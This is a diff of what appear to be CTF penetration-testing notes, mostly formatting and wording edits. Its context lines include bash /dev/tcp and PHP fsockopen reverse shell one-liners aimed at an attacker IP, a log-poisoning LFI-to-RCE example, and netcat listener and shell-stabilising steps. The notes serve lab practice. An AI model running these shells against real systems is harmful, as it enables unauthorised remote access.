@@ -184,11 +184,11 @@ You can use hydra to bruteforce FTP access. You should check for executables fil
 - **Metasploit**: sometimes banned from CTF environments
 
 - **Bash script**: deploy a bash script on the victim machine and execute it (check folder and file permissions)
-      
+
       #!/bin/bash
       bash -i >& /dev/tcp/10.8.32.131/5000 0>&1
 
-      Or you can directly craft a bash script and execute it:
+     Or you can directly craft a bash script and execute it:
 
       echo "bash -c 'bash -i >& /dev/tcp/10.8.32.131/5000 0>&1'" > /tmp/shell.sh
       
@@ -208,17 +208,17 @@ All reverse shells are available at [Reverse Shell Cheat Sheet](https://github.c
 
       export TERM=xterm
     
-- Cntrl + Z
+- Press Cntrl + Z and then:
 
       stty raw -echo; fg 
 
 ### rlwrap
 
-- Use rlwrap prepended nc command at the listener
+- Prepend rlwrap before the `nc` command at the listener
 
       rlwrap nc -nlvp [port]
 
-- Cntrl + Z
+- Press Cntrl + Z and then:
 
       stty raw -echo; fg
 
@@ -272,7 +272,6 @@ This means getting command execution on target exploiting LFI.
 
 Where we URL encoded `php -r '$sock=fsockopen("10.8.32.131",5000);exec("/bin/sh -i <&3 >&3 2>&3");'`. This is also known as **Log poisoning**.
 For all other LFI-2-RCE (via /proc/self/environ, via upload, via PHPSESSID, via vsftpd logs ecc.) have a look on [HackTricks](https://book.hacktricks.xyz/pentesting-web/file-inclusion).
-
 
 ### SSRF
 
